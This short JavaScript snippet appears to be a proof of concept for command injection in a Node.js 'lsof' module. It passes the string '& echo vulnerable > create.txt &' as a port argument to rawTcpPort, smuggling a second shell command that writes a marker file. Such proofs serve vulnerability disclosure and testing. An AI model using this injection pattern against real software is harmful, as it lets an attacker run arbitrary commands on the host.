var root = require("./lsof");
var attack_code = "& echo vulnerable > create.txt &";
root.rawTcpPort(attack_code, function(){});